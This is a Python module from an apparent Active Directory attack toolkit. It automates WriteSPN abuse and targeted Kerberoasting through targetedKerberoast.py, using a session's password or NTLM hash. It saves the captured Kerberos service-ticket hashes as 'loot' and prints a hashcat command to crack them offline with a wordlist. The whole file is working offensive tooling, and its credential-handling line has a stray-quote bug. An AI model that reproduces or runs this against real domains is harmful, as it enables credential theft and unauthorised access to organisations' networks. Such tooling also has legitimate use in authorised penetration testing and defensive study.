# modules/writespn.py

import os
import re
from core.colors import red, green, yellow, blue
from core.helpers import run_command, save_loot, select_from_list

def attack_writespn(session):
    print(blue("[*] Starting WriteSPN + Kerberoast via targetedKerberoast.py..."))

    tool_path = os.path.join("tools", "targetedKerberoast.py")
    if not os.path.exists(tool_path):
        print(red(f"[-] Tool not found: {tool_path}"))
        print(yellow("[!] Please place targetedKerberoast.py in the tools/ directory."))
        return

    output_file = "loot/Spn.hash"

    if session.hash:
        auth = f"-u '{session.username}' -p :{session.hash}'"
    elif session.password:
        auth = f"-u '{session.username}' -p '{session.password}'"

    cmd = (
        f"python3 {tool_path} -v -d '{session.domain}' {auth} "
        f"-f hashcat -o {output_file}"
    )

    out, err = run_command(cmd)
    combined = out + "\n" + err

    if not os.path.exists(output_file):
        print(red("[-] No hash file created. SPN write or roast may have failed."))
        print(combined)
        return

    with open(output_file, "r") as f:
        contents = f.read().strip()

    if any("$krb5tgs$" in line for line in contents.splitlines()):
        print(green(f"[+] SPN Kerberoast succeeded. Hash saved to: {output_file}"))
        save_loot("Spn.hash", contents)
        print(blue("[*] Example crack command:"))
        print(yellow("  hashcat -m 13100 -a 0 loot/Spn.hash /usr/share/wordlists/rockyou.txt"))
    else:
        print(red("[-] No valid Kerberoast hashes found."))
        print(combined)
